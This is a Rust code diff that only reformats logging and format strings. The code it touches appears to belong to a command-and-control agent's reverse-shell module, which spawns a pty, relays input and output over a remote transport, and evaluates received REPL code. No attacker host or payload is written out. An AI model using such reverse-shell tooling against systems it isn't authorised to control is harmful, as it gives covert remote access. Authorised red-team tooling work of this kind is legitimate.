@@ -33,7 +33,7 @@ pub async fn run_reverse_shell_pty<T: Transport>(
     let (internal_exit_tx, mut internal_exit_rx) = tokio::sync::mpsc::channel(1);
 
     #[cfg(debug_assertions)]
-    log::info!("starting reverse_shell_pty (task_id={})", task_id);
+    log::info!("starting reverse_shell_pty (task_id={task_id})");
 
     // First, send an initial registration message
     if let Err(_err) = output_tx
@@ -45,7 +45,7 @@ pub async fn run_reverse_shell_pty<T: Transport>(
         .await
     {
         #[cfg(debug_assertions)]
-        log::error!("failed to send initial registration message: {}", _err);
+        log::error!("failed to send initial registration message: {_err}");
     }
 
     // Use the native pty implementation for the system
@@ -110,7 +110,7 @@ pub async fn run_reverse_shell_pty<T: Transport>(
                 Ok(n) => n,
                 Err(_err) => {
                     #[cfg(debug_assertions)]
-                    log::error!("failed to read pty: {}", _err);
+                    log::error!("failed to read pty: {_err}");
                     break;
                 }
             };
@@ -120,7 +120,7 @@ pub async fn run_reverse_shell_pty<T: Transport>(
                     Ok(None) | Err(tokio::sync::mpsc::error::TryRecvError::Empty) => {}
                     Ok(Some(_status)) => {
                         #[cfg(debug_assertions)]
-                        log::info!("closing output stream, pty exited: {}", _status);
+                        log::info!("closing output stream, pty exited: {_status}");
                         break;
                     }
                     Err(tokio::sync::mpsc::error::TryRecvError::Disconnected) => {
@@ -140,7 +140,7 @@ pub async fn run_reverse_shell_pty<T: Transport>(
                 .await
             {
                 #[cfg(debug_assertions)]
-                log::error!("reverse_shell_pty output failed to queue: {}", _err);
+                log::error!("reverse_shell_pty output failed to queue: {_err}");
                 break;
             }
 
@@ -154,7 +154,7 @@ pub async fn run_reverse_shell_pty<T: Transport>(
                 .await
             {
                 #[cfg(debug_assertions)]
-                log::error!("reverse_shell_pty ping failed: {}", _err);
+                log::error!("reverse_shell_pty ping failed: {_err}");
                 break;
             }
         }
@@ -170,7 +170,7 @@ pub async fn run_reverse_shell_pty<T: Transport>(
     loop {
         if let Ok(Some(_status)) = child.try_wait() {
             #[cfg(debug_assertions)]
-            log::info!("closing input stream, pty exited: {}", _status);
+            log::info!("closing input stream, pty exited: {_status}");
             break;
         }
 
@@ -180,7 +180,7 @@ pub async fn run_reverse_shell_pty<T: Transport>(
             }
             if let Err(_err) = writer.write_all(&msg.data) {
                 #[cfg(debug_assertions)]
-                log::error!("reverse_shell_pty failed to write input: {}", _err);
+                log::error!("reverse_shell_pty failed to write input: {_err}");
             }
         } else {
             let _ = child.kill();
@@ -194,7 +194,7 @@ pub async fn run_reverse_shell_pty<T: Transport>(
     }
 
     #[cfg(debug_assertions)]
-    log::info!("stopping reverse_shell_pty (task_id={})", task_id);
+    log::info!("stopping reverse_shell_pty (task_id={task_id})");
     Ok(())
 }
 
@@ -208,7 +208,7 @@ pub async fn run_repl_reverse_shell<T: Transport + Send + Sync + 'static>(
     let (input_tx, input_rx) = tokio::sync::mpsc::channel(1);
 
     #[cfg(debug_assertions)]
-    log::info!("starting repl_reverse_shell (task_id={})", task_id);
+    log::info!("starting repl_reverse_shell (task_id={task_id})");
 
     // Initial Registration
     if let Err(_err) = output_tx
@@ -220,7 +220,7 @@ pub async fn run_repl_reverse_shell<T: Transport + Send + Sync + 'static>(
         .await
     {
         #[cfg(debug_assertions)]
-        log::error!("failed to send initial registration message: {}", _err);
+        log::error!("failed to send initial registration message: {_err}");
     }
 
     // Initiate gRPC stream
@@ -271,7 +271,7 @@ async fn run_repl_loop<T: Transport + Send + Sync + 'static>(
             let inputs = parser.parse(&msg.data);
             for input in inputs {
                 #[cfg(debug_assertions)]
-                log::info!("Handling input: {:?}", input);
+                log::info!("Handling input: {input:?}");
                 match repl.handle_input(input) {
                     ReplAction::Quit => return,
                     ReplAction::Submit { code, .. } => {
@@ -283,12 +283,12 @@ async fn run_repl_loop<T: Transport + Send + Sync + 'static>(
                         match interpreter.interpret(&code) {
                             Ok(v) => {
                                 if !matches!(v, Value::None) {
-                                    let s = format!("{:?}\r\n", v);
+                                    let s = format!("{v:?}\r\n");
                                     let _ = stdout.write(s.as_bytes());
                                 }
                             }
                             Err(e) => {
-                                let s = format!("Error: {}\r\n", e);
+                                let s = format!("Error: {e}\r\n");
                                 let _ = stdout.write(s.as_bytes());
                             }
                         }
@@ -338,7 +338,7 @@ impl<T: Transport + Send + Sync> fmt::Debug for ShellPrinter<T> {
 impl<T: Transport + Send + Sync + 'static> Printer for ShellPrinter<T> {
     fn print_out(&self, _span: &Span, s: &str) {
         // Send to REPL
-        let display_s = format!("{}\r\n", s);
+        let display_s = format!("{s}\r\n");
         let _ = self.tx.blocking_send(ReverseShellRequest {
             kind: ReverseShellMessageKind::Data.into(),
             data: display_s.into_bytes(),
@@ -349,7 +349,7 @@ impl<T: Transport + Send + Sync + 'static> Printer for ShellPrinter<T> {
         let req = ReportTaskOutputRequest {
             output: Some(TaskOutput {
                 id: self.task_id,
-                output: format!("{}\n", s),
+                output: format!("{s}\n"),
                 error: None,
                 exec_started_at: None,
                 exec_finished_at: None,
@@ -359,7 +359,7 @@ impl<T: Transport + Send + Sync + 'static> Printer for ShellPrinter<T> {
     }
 
     fn print_err(&self, _span: &Span, s: &str) {
-        let display_s = format!("{}\r\n", s);
+        let display_s = format!("{s}\r\n");
         let _ = self.tx.blocking_send(ReverseShellRequest {
             kind: ReverseShellMessageKind::Data.into(),
             data: display_s.into_bytes(),
@@ -423,7 +423,7 @@ impl InputParser {
 
     fn parse(&mut self, data: &[u8]) -> Vec<Input> {
         #[cfg(debug_assertions)]
-        log::debug!("Received raw bytes: {:02x?}", data);
+        log::debug!("Received raw bytes: {data:02x?}");
 
         self.buffer.extend_from_slice(data);
         let mut inputs = Vec::new();
@@ -465,7 +465,7 @@ impl InputParser {
                                 inputs.push(input);
                             } else {
                                 #[cfg(debug_assertions)]
-                                log::warn!("Ignored CSI sequence: {:02x?}", seq);
+                                log::warn!("Ignored CSI sequence: {seq:02x?}");
                             }
                             // Consume
                             self.buffer.drain(0..=end);
@@ -496,7 +496,7 @@ impl InputParser {
                             inputs.push(input);
                         } else {
                             #[cfg(debug_assertions)]
-                            log::warn!("Ignored SS3 sequence: {:02x?}", seq);
+                            log::warn!("Ignored SS3 sequence: {seq:02x?}");
                         }
                         self.buffer.drain(0..3);
                     }
@@ -504,7 +504,7 @@ impl InputParser {
                         // Unknown Escape Sequence or Alt+Key
                         // To be safe and avoid "random characters injected", we consume ESC and the next char.
                         #[cfg(debug_assertions)]
-                        log::warn!("Unknown Escape sequence start: 1b {:02x}", second);
+                        log::warn!("Unknown Escape sequence start: 1b {second:02x}");
                         self.buffer.drain(0..2);
                     }
                 }
@@ -526,7 +526,7 @@ impl InputParser {
                     _ => {
                         // Other control codes? Ignore them to prevent weirdness
                         #[cfg(debug_assertions)]
-                        log::debug!("Ignored control char: {:02x}", b);
+                        log::debug!("Ignored control char: {b:02x}");
                     }
                 }
                 self.buffer.remove(0);
